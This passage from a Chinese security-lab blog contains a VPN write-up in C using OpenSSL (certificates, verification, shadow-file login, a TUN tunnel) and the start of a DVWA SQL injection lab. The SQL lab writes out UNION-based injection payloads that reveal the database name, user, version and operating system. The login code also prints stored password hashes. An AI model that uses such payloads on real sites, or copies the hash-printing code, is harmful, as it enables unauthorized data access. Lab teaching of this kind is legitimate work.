src="/2020/12/22/VPN/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p>会生成<code>cacert.pem</code>文件和<code>cakey.pem</code>，即CA的证书文件和私钥</p><ul><li>之后，服务器产生一对私钥，采用des3加密</li></ul><pre><code class="hljs angelscript">openssl genrsa -des3 -<span class="hljs-keyword">out</span> server-key.pem <span class="hljs-number">1024</span></code></pre><p>文件密码还是<code>123456</code></p><ul><li>然后根据证书生成证书请求文件<code>server-csr.pem</code></li></ul><pre><code class="hljs pgsql">openssl req -<span class="hljs-built_in">new</span> -key <span class="hljs-keyword">server</span>-key.pem -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>-csr.pem -config openssl.cnf</code></pre><p><img src="/2020/12/22/VPN/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><ul><li>生成服务端签名证书</li></ul><pre><code class="hljs css"><span class="hljs-selector-tag">openssl</span> <span class="hljs-selector-tag">ca</span> <span class="hljs-selector-tag">-in</span> <span class="hljs-selector-tag">server-csr</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-out</span> <span class="hljs-selector-tag">server-cert</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-cert</span> <span class="hljs-selector-tag">cacert</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-keyfile</span> <span class="hljs-selector-tag">cakey</span><span class="hljs-selector-class">.pem</span><span class="hljs-selector-tag">-config</span> <span class="hljs-selector-tag">openssl</span><span class="hljs-selector-class">.cnf</span> <span class="hljs-selector-tag">-days</span> 3650</code></pre><ul><li><p>之后把<code>cacert.pem</code>文件复制到<code>ca_client</code>文件夹下面</p></li><li><p>之后生成散列值并且利用散列值创建符号链接</p></li></ul><pre><code class="hljs css"><span class="hljs-selector-tag">openssl</span> <span class="hljs-selector-tag">x509</span> <span class="hljs-selector-tag">-in</span> <span class="hljs-selector-tag">cacert</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-noout</span> <span class="hljs-selector-tag">-subject_hash</span><span class="hljs-selector-tag">ln</span> <span class="hljs-selector-tag">-s</span> <span class="hljs-selector-tag">cacert</span><span class="hljs-selector-class">.pem</span> 3<span class="hljs-selector-tag">de75e64</span><span class="hljs-selector-class">.0</span></code></pre><p>之后运行程序，成功</p><ul><li><strong>server端</strong></li></ul><p><img src="/2020/12/22/VPN/3-4.PNG" srcset="/img/loading.gif" alt="3-4"></p><ul><li><strong>client端</strong></li></ul><p><img src="/2020/12/22/VPN/3-5.PNG" srcset="/img/loading.gif" alt="3-5"></p><p>同时，对wireshark抓包结果进行分析</p><p><img src="/2020/12/22/VPN/3-3.PNG" srcset="/img/loading.gif" alt="3-3"></p><p>首先，能明显看到TCP连接建立的握手过程（SYN、ACK包）、数据传输的过程以及断开连接的过程（FIN、ACK包），同时随便选择一个数据包，分析Data字段，可以看到是加密传输，不是明文传输</p><p><img src="/2020/12/22/VPN/3-6.PNG" srcset="/img/loading.gif" alt="3-6"></p><h3 id="task-4：VPN服务器验证"><a href="#task-4：VPN服务器验证" class="headerlink" title="task 4：VPN服务器验证"></a>task 4：VPN服务器验证</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>在建立VPN之前，要对VPN服务器进行验证，是通过使用公钥证书的方式来实现的</p><p>具体分为三部：1.首先要验证服务器证书有效 2.验证服务器是证书的所有者 3.验证服务器是目标服务器</p><h4 id="具体实现-1"><a href="#具体实现-1" class="headerlink" title="具体实现"></a>具体实现</h4><ul><li><p><strong>指出执行上述验证的代码行</strong></p><p>  首先，验证部分包括服务端发送服务器证书以及客户端对于证书的验证过程</p><p>  <strong>server</strong></p></li></ul><pre><code class="hljs c"><span class="hljs-comment">// Step 0: OpenSSL library initialization </span><span class="hljs-comment">// This step is no longer needed as of version 1.1.0.</span>SSL_library_init();<span class="hljs-comment">//进行协议初始化工作</span>SSL_load_error_strings();<span class="hljs-comment">//加载错误信息</span>SSLeay_add_ssl_algorithms();<span class="hljs-comment">//添加SSL加密算法</span><span class="hljs-comment">// Step 1: SSL context initialization</span>meth = (SSL_METHOD *)TLSv1_2_method();ctx = SSL_CTX_new(meth);<span class="hljs-comment">//创建会话环境</span>SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//指定握手阶段的证书验证方式，SSL_VERIFY_NONE表示完全忽略验证证书的结果</span><span class="hljs-comment">// Step 2: Set up the server certificate and private key</span>SSL_CTX_use_certificate_file(ctx, <span class="hljs-string">"./cert_server/server-cert.pem"</span>, SSL_FILETYPE_PEM);SSL_CTX_use_PrivateKey_file(ctx, <span class="hljs-string">"./cert_server/server-key.pem"</span>, SSL_FILETYPE_PEM);<span class="hljs-comment">//加载服务端证书和私钥</span><span class="hljs-comment">// Step 3: Create a new SSL structure for a connection</span>ssl = SSL_new (ctx);</code></pre><p>​    <strong>client</strong></p><pre><code class="hljs c"><span class="hljs-function">SSL* <span class="hljs-title">setupTLSClient</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* hostname)</span></span><span class="hljs-function"></span>&#123;   <span class="hljs-comment">// Step 0: OpenSSL library initialization </span>   <span class="hljs-comment">// This step is no longer needed as of version 1.1.0.</span>   SSL_library_init();   SSL_load_error_strings();   SSLeay_add_ssl_algorithms();   SSL_METHOD *meth;   SSL_CTX* ctx;   SSL* ssl;   meth = (SSL_METHOD *)TLSv1_2_method();   ctx = SSL_CTX_new(meth);   SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//SSL_VERIFY_PEER表示希望验证对方证书</span>   <span class="hljs-keyword">if</span>(SSL_CTX_load_verify_locations(ctx,<span class="hljs-literal">NULL</span>, CA_DIR) &lt; <span class="hljs-number">1</span>)&#123;<span class="hljs-comment">//SSL_CTX_load_verify_locations为CA证书所在目录，这里实现了上面所说的步骤一对于服务器证书的验证：利用CA_DIR目录下面的CA证书去验证服务器证书是否有效</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error setting the verify locations. \n"</span>);<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);   &#125;   ssl = SSL_new (ctx);   X509_VERIFY_PARAM *vpm = SSL_get0_param(ssl);    X509_VERIFY_PARAM_set1_host(vpm, hostname, <span class="hljs-number">0</span>);<span class="hljs-comment">//实现步骤三对于hostname的验证，检查服务器hostname</span>   <span class="hljs-keyword">return</span> ssl;&#125;</code></pre><p>而第二步的检查在验证证书合法性的时候就已经验证了</p><h3 id="task-5：VPN客户端验证"><a href="#task-5：VPN客户端验证" class="headerlink" title="task 5：VPN客户端验证"></a>task 5：VPN客户端验证</h3><p>在这一个task当中，我们需要对VPN客户端进行验证，client会向server端发送username和password，之后server端通过shadow文件匹配来验证对方身份</p><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>在server端加入对用户信息的请求，用户在终端上输入username以及password，参考文档的3.3节</p><h4 id="具体实现-2"><a href="#具体实现-2" class="headerlink" title="具体实现"></a>具体实现</h4><ul><li>在server端添加<code>loginrequest()</code>函数，以及通过<code>login()</code>来进行信息的验证</li></ul><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">loginRequest</span><span class="hljs-params">(SSL* ssl,<span class="hljs-keyword">int</span> sock)</span></span>&#123;    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1024</span>];<span class="hljs-keyword">char</span> username[<span class="hljs-number">1024</span>];<span class="hljs-keyword">char</span> password[<span class="hljs-number">1024</span>];    <span class="hljs-comment">//将请求用户名的语句SSL_write到Client,从client端读取到的后面的输入字符串SSL_read到username</span><span class="hljs-keyword">char</span>* requsr = <span class="hljs-string">"Please enter username:"</span>;SSL_write(ssl,requsr,<span class="hljs-built_in">strlen</span>(requsr));<span class="hljs-keyword">int</span> usrlen = SSL_read(ssl,username,<span class="hljs-keyword">sizeof</span>(username)<span class="hljs-number">-1</span>);username[usrlen] = <span class="hljs-string">'\0'</span>;    <span class="hljs-comment">//将请求用户口令的语句SSL_write到Client,从client端读取到的输入字符串SSL_read到 password</span><span class="hljs-keyword">char</span>* reqpsd = <span class="hljs-string">"Please enter password:"</span>;SSL_write(ssl,reqpsd,<span class="hljs-built_in">strlen</span>(reqpsd));<span class="hljs-keyword">int</span> psdlen = SSL_read(ssl,password,<span class="hljs-keyword">sizeof</span>(password)<span class="hljs-number">-1</span>);password[psdlen] = <span class="hljs-string">'\0'</span>;    login(username,password); <span class="hljs-comment">//检查shadow文件中是否有该用户的信息</span>&#125;</code></pre><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">login</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *user, <span class="hljs-keyword">char</span> *passwd)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spwd</span> *<span class="hljs-title">pw</span>;</span><span class="hljs-keyword">char</span> *epasswd;pw = getspnam(user);<span class="hljs-keyword">if</span> (pw == <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Login name: %s\n"</span>, pw-&gt;sp_namp);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Passwd : %s\n"</span>, pw-&gt;sp_pwdp);epasswd = crypt(passwd, pw-&gt;sp_pwdp);<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(epasswd, pw-&gt;sp_pwdp)) &#123;<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;&#125;</code></pre><p>对<code>main()</code>函数中只需要在处理client的GET请求的<code>processRequest()</code>函数之前加上<code>loginrequest()</code>即可</p><ul><li>client端在收到来自于server端的用户信息的请求之后，就直接<code>scanf()</code>输入即可，但是要求用户密码不可见，就用<code>getpass()</code>函数即可</li></ul><pre><code class="hljs c"><span class="hljs-built_in">printf</span> (<span class="hljs-string">"SSL connection using %s\n"</span>, SSL_get_cipher(ssl));<span class="hljs-comment">/*----------------Send username &amp; password-------------*/</span><span class="hljs-keyword">int</span> len1;<span class="hljs-keyword">char</span> username[<span class="hljs-number">20</span>];<span class="hljs-keyword">char</span>* password;<span class="hljs-keyword">char</span> usrbuf[<span class="hljs-number">1000</span>];<span class="hljs-keyword">char</span> pwdbuf[<span class="hljs-number">1000</span>];len1 = SSL_read (ssl, usrbuf, <span class="hljs-keyword">sizeof</span>(usrbuf)<span class="hljs-number">-1</span>);<span class="hljs-comment">//SSL_read来获取Server的请求用户名的信息</span>usrbuf[len1] = <span class="hljs-string">'\0'</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, usrbuf);<span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s:"</span>,username);SSL_write (ssl,username,<span class="hljs-built_in">strlen</span>(username));<span class="hljs-comment">//将username通过SSL_write到Server</span>len1 = SSL_read (ssl, pwdbuf, <span class="hljs-keyword">sizeof</span>(pwdbuf)<span class="hljs-number">-1</span>);<span class="hljs-comment">//SSL_read到Server的请求用户口令的信息</span>pwdbuf[len1] = <span class="hljs-string">'\0'</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, pwdbuf);password = getpass(<span class="hljs-string">""</span>);SSL_write(ssl,password,<span class="hljs-built_in">strlen</span>(password));<span class="hljs-comment">//将password SSL_write到Server</span><span class="hljs-comment">/*----------------Send/Receive data --------------------*/</span></code></pre><p>运行结果如下：</p><p><strong>client端</strong></p><p><img src="/2020/12/22/VPN/5-3.PNG" srcset="/img/loading.gif" alt="5-3"></p><p><strong>server端</strong></p><p><img src="/2020/12/22/VPN/5-1.PNG" srcset="/img/loading.gif" alt="5-1"></p><p>而当我们没有正确的输入用户名和密码的时候，用户端会直接退出</p><p><img src="/2020/12/22/VPN/5-4.PNG" srcset="/img/loading.gif" alt="5-4"></p><h3 id="task-6：支持多进程"><a href="#task-6：支持多进程" class="headerlink" title="task 6：支持多进程"></a>task 6：支持多进程</h3><p><img src="/2020/12/22/VPN/6-1.PNG" srcset="/img/loading.gif" alt="6-1"></p><p>在之前的task当中，我们只是实现了数据的加密传输（SSL），但是还没有完全的实现VPN，因为没用通过使用TUN接口来构建VPN隧道，所以接下来我们实际要实现的就是在多进程的条件下来实现我们对于TUN接口的使用</p><ul><li><strong>client端</strong></li></ul><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">createTunDevice</span><span class="hljs-params">()</span> </span><span class="hljs-function"></span>&#123;<span class="hljs-comment">//该函数的作用就是新建一个tun接口并且返回对应的文件描述符，无需修改，直接加到tlsclient即可</span>   <span class="hljs-keyword">int</span> tunfd;   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span>   <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));   ifr.ifr_flags = IFF_TUN | IFF_NO_PI;     tunfd = <span class="hljs-built_in">open</span>(<span class="hljs-string">"/dev/net/tun"</span>, O_RDWR);   ioctl(tunfd, TUNSETIFF, &amp;ifr);          <span class="hljs-keyword">return</span> tunfd;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">tunSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, SSL* ssl)</span></span>&#123;<span class="hljs-keyword">int</span> len;<span class="hljs-keyword">char</span> buff[BUFF_SIZE];<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Got a packet from TUN\n"</span>);    bzero(buff, BUFF_SIZE);len = <span class="hljs-built_in">read</span>(tunfd, buff, BUFF_SIZE);<span class="hljs-comment">//read函数将从tunfd当中的数据读取到buff当中</span><span class="hljs-comment">//sendto(sockfd, buff, len, 0, (struct sockaddr *) &amp;peerAddr,sizeof(peerAddr));</span>SSL_write(ssl,buff,len);<span class="hljs-comment">//写给ssl套接字</span>&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">socketSelected</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, SSL* ssl)</span></span>&#123;<span class="hljs-keyword">int</span> len;<span class="hljs-keyword">char</span> buff[BUFF_SIZE];<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Got a packet from the tunnel\n"</span>);    bzero(buff, BUFF_SIZE);<span class="hljs-comment">//len = recvfrom(sockfd, buff, BUFF_SIZE, 0, NULL, NULL);</span>len = SSL_read(ssl,buff,<span class="hljs-keyword">sizeof</span>(buff)<span class="hljs-number">-1</span>);<span class="hljs-built_in">write</span>(tunfd, buff, len);<span class="hljs-comment">//写给tunfd来进行外层的解包</span>&#125;</code></pre><ul><li><strong>server端</strong>，所需要的函数和上面基本一样，在main里面的修改如下</li></ul><pre><code class="hljs c"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;    <span class="hljs-keyword">int</span> sock = accept(listen_sock, (struct sockaddr*)&amp;sa_client, &amp;client_len);    <span class="hljs-keyword">if</span> (fork() == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// The child process</span>       <span class="hljs-built_in">close</span> (listen_sock);       SSL_set_fd (ssl, sock);       <span class="hljs-keyword">int</span> err = SSL_accept (ssl);       CHK_SSL(err);       <span class="hljs-built_in">printf</span> (<span class="hljs-string">"SSL connection established!\n"</span>);       loginrequest(ssl, sock);       processRequest(ssl, sock);       <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;          fd_set readFDSet;          FD_ZERO(&amp;readFDSet);          FD_SET(sock, &amp;readFDSet);          FD_SET(tunfd, &amp;readFDSet);          select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);          <span class="hljs-keyword">if</span> (FD_ISSET(tunfd, &amp;readFDSet)) tunSelected(tunfd, ssl);          <span class="hljs-keyword">if</span> (FD_ISSET(sock, &amp;readFDSet)) socketSelected(tunfd, ssl);       &#125;       <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// The parent process</span>        <span class="hljs-built_in">close</span>(sock);    &#125;  &#125;</code></pre><p>之后就按照task 2的一些步骤来弄就行</p><h4 id="pipe实现"><a href="#pipe实现" class="headerlink" title="pipe实现"></a>pipe实现</h4><p>在pipe的是相当中，会区分父子进程，父进程负责将从tun接口收到的数据发给子进程，而子进程有两种情况要处理，第一种是将来自父进程的数据通过通过ssl/tls发给客户端进程，第二种是将来自于客户端的程序传递给tun接口</p><p>具体实现</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">tunPipeSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, <span class="hljs-keyword">int</span> pipefd)</span> </span>&#123;    <span class="hljs-comment">//该函数的作用是实现父进程的作用，从tun接口通过read来把数据读取到pipe的输出端口上</span><span class="hljs-keyword">int</span> len;<span class="hljs-keyword">char</span> buff[BUFF_SIZE];<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Got a packet from TUN Interface\n"</span>);    bzero(buff, BUFF_SIZE);len = <span class="hljs-built_in">read</span>(tunfd, buff, BUFF_SIZE);buff[len] = <span class="hljs-string">'\0'</span>;<span class="hljs-built_in">write</span>(pipefd, buff, len);&#125;</code></pre><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pipeSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pipefd, <span class="hljs-keyword">int</span> sockfd, SSL *ssl)</span> </span>&#123;    <span class="hljs-comment">//该函数的作用是实现子进程从父进程通过pipe来得到的数据写入到ssl的socket上</span><span class="hljs-keyword">int</span> len;<span class="hljs-keyword">char</span> buff[BUFF_SIZE];<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Got a packet from TUN Interface\n"</span>);    bzero(buff, BUFF_SIZE);len = <span class="hljs-built_in">read</span>(pipefd, buff, BUFF_SIZE);buff[len] = <span class="hljs-string">'\0'</span>;SSL_write(ssl, buff, len);&#125;</code></pre><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">socketSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pipefd, <span class="hljs-keyword">int</span> sockfd, SSL *ssl, <span class="hljs-keyword">int</span> tunfd)</span> </span>&#123;    <span class="hljs-comment">//该函数的作用是将来自客户端的程序发给了</span><span class="hljs-keyword">int</span> len;<span class="hljs-keyword">char</span> buff[BUFF_SIZE];<span class="hljs-keyword">char</span> *ptr = buff;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Got a packet from the tunnel established \n"</span>);    bzero(buff, BUFF_SIZE);len = SSL_read(ssl, buff, BUFF_SIZE);buff[len] = <span class="hljs-string">'\0'</span>;<span class="hljs-built_in">write</span>(tunfd, buff, len);&#125;</code></pre><p>对于<code>main()</code>函数的修改</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;SSL_METHOD *meth;SSL_CTX* ctx;SSL *ssl;<span class="hljs-keyword">int</span> err;    <span class="hljs-comment">// Step 0: OpenSSL library initialization</span><span class="hljs-comment">// This step is no longer needed as of version 1.1.0.</span>SSL_library_init();SSL_load_error_strings();SSLeay_add_ssl_algorithms();    <span class="hljs-comment">// Step 1: SSL context initialization</span>meth = (SSL_METHOD *)TLSv1_2_method();ctx = SSL_CTX_new(meth);SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, <span class="hljs-literal">NULL</span>);    <span class="hljs-comment">// Step 2: Set up the server certificate and private key</span>SSL_CTX_use_certificate_file(ctx, <span class="hljs-string">"./cert_server/server-cert.pem"</span>,SSL_FILETYPE_PEM);SSL_CTX_use_PrivateKey_file(ctx, <span class="hljs-string">"./cert_server/server-key.pem"</span>,SSL_FILETYPE_PEM);    <span class="hljs-comment">// Step 3: Create a new SSL structure for a connection</span>ssl = SSL_new (ctx);<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sa_client</span>;</span><span class="hljs-keyword">size_t</span> client_len;<span class="hljs-keyword">int</span> tunfd = createTunDevice();<span class="hljs-keyword">int</span> listen_sock = setupTCPServer();    <span class="hljs-keyword">int</span> fd[<span class="hljs-number">2</span>];<span class="hljs-comment">//pipe输入端和pipe输出端</span><span class="hljs-keyword">pid_t</span> pid;    pipe(fd);pid = fork();<span class="hljs-comment">//fork子进程，pid为子进程id</span><span class="hljs-keyword">if</span>(pid==<span class="hljs-number">-1</span>)&#123;perror(<span class="hljs-string">"fork"</span>);<span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);&#125;<span class="hljs-keyword">if</span>(pid&gt;<span class="hljs-number">0</span>)&#123;<span class="hljs-built_in">close</span>(fd[<span class="hljs-number">0</span>]);<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;fd_set readFDSet;FD_ZERO(&amp;readFDSet);FD_SET(tunfd, &amp;readFDSet);select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<span class="hljs-keyword">if</span> (FD_ISSET(tunfd, &amp;readFDSet)) tunPipeSelected(tunfd, fd[<span class="hljs-number">1</span>]);&#125;<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-built_in">close</span>(fd[<span class="hljs-number">1</span>]);<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">int</span> sock = accept(listen_sock, (struct sockaddr*)&amp;sa_client, &amp;client_len);<span class="hljs-keyword">if</span> (fork() == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// The child process</span><span class="hljs-built_in">close</span> (listen_sock);            SSL_set_fd (ssl, sock);<span class="hljs-keyword">int</span> err = SSL_accept (ssl);CHK_SSL(err);<span class="hljs-built_in">printf</span> (<span class="hljs-string">"SSL connection established in child process!\n"</span>);loginRequest(ssl,sock);processRequest(ssl, sock);<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;fd_set readFDSet;                FD_ZERO(&amp;readFDSet);FD_SET(sock, &amp;readFDSet);FD_SET(fd[<span class="hljs-number">0</span>], &amp;readFDSet);                select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<span class="hljs-keyword">if</span> (FD_ISSET(fd[<span class="hljs-number">0</span>],&amp;readFDSet)) pipeSelected(fd[<span class="hljs-number">0</span>], sock, ssl);<span class="hljs-keyword">if</span> (FD_ISSET(sock, &amp;readFDSet)) socketSelected(fd[<span class="hljs-number">0</span>],sock,ssl,tunfd);&#125;&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// The parent process</span><span class="hljs-built_in">close</span>(sock);&#125;&#125;&#125;&#125;</code></pre><p>并且此时并不需要在单线程的时候所写的<code>socketSelecct()</code>和<code>tunSelect()</code>，</p>]]></content>
    
    
    
    <tags>
      
      <tag>Network Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入实验</title>
    <link href="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/"/>
    <url>/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="实验基本原理-amp-目的"><a href="#实验基本原理-amp-目的" class="headerlink" title="实验基本原理&amp;目的"></a>实验基本原理&amp;目的</h2><blockquote><p>Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。</p></blockquote><p>参考blog：<a href="https://www.jianshu.com/p/078df7a35671" target="_blank" rel="noopener">SQL注入基本原理</a></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="猜解数据库"><a href="#猜解数据库" class="headerlink" title="猜解数据库"></a>猜解数据库</h3><p><strong>Step1：理解PHP页面通过get方法传递参数</strong></p><p>当我们的sercurity level为low的时候，分析网页的html源码会发现是php的参数通过get方法来进行获取的</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p><p>而当时medium的时候，是通过POST来获取的，用户不再输入，而是仅能通过选择来进行</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p><p><strong>Step 2：查看source code</strong></p><p>当安全级别为medium的时候，我们可以看到source code中的SQL查询语句为</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><p>那么当我们输入id（例如：1）之后，所构造的SQL的完整语句就是</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span>;</code></pre><p>意思是在名为<code>users</code>的表中找到<code>user_id</code>这个列中内容为<code>&quot;1&quot;</code>的那一条数据的<code>first_name</code>以及<code>last_name</code>的值</p><p>所以之后我们可以通过控制输入的参数id的值来调整执行的SQL语句</p><p><strong>Step 3：猜解SQL查询语句当中的字段数</strong></p><ul><li>（可能是在这里有输入的提示才不进行SQL注入类型的判断，但是正常情况下要实现判断注入的类型时字符型还是数字型）</li></ul><p>在这里通过<code>Burp Suit</code>输入<code>1&#39; order by 1#</code>，此时php所要执行的SQL语句就变为了</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span><span class="hljs-comment">#';</span></code></pre><p>此时SQL会把#后面内容屏蔽来避免语句错误，但是此时会发现提示语法错误</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-6.PNG" srcset="/img/loading.gif" alt="1-6"></p><p>在这里，根据参考<a href="https://yq.aliyun.com/articles/473535" target="_blank" rel="noopener">渗透学习笔记–基础篇–sql注入（数字型）</a>会发现是由于’ 被转义为了\，之后注入的时候只需要输入<code>1 order by 1#</code>即可</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-4.PNG" srcset="/img/loading.gif" alt="1-4"></p><p>结果为</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-7.PNG" srcset="/img/loading.gif" alt="1-7"></p><p>同时测试<code>1 order by 2#</code>，发现也成功，但是到了order by 3#的时候，会发现出现错误，说明这个名为<code>users</code>的表应该是2列</p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-8.PNG" srcset="/img/loading.gif" alt="1-8"></p><p><strong>Step 4：获取数据库名等信息</strong></p><p>在这里，我们构造<code>1 union select database(),user()</code></p><ul><li><code>database()</code>会返回当前网站所使用的数据库的名字</li><li><code>user()</code>会返回执行当前查询的用户的名字</li></ul><p>此时，SQL<strong>实际执行</strong>的语句应该为</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span><span class="hljs-keyword">union</span><span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),<span class="hljs-keyword">user</span>()<span class="hljs-comment">#;</span></code></pre><p>意思为，首先在user这个表中找到user_id 为1的first_name和last name两列，之后再<code>select database(), user()</code>，最后将两个select出的表格合并，之后返回html页面，如图显示，所以数据库名为<code>dvwa</code>，执行当前查询的用户的名字为<code>root@localhost</code></p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/1-9.PNG" srcset="/img/loading.gif" alt="1-9"></p><p> <strong>Step 5：获取数据库版本以及操作系统信息</strong></p><p>在这里，我们输入的是<code>1 union select version(),@@version_compile_os#</code></p><ul><li><code>version()</code>获取当前数据库的版本信息</li><li><code>@@version_compile_os</code>获取当前操作系统信息</li></ul><p>此时，实际执行的SQL语句为</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">version</span>(),@@version_compile_os<span class="hljs-comment">#;</span></code></pre><p>具体的意思可结合上面step和函数作用了解，执行结果为下图，我们可以了解当前数据库版本为<code>5.5.53</code>，操作系统为<code>win32</code></p><p><img src="/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><p><strong>Step 6：获取数据库中的表名</strong></p><blockquote><p><code>information_schema</code> 是 mysql 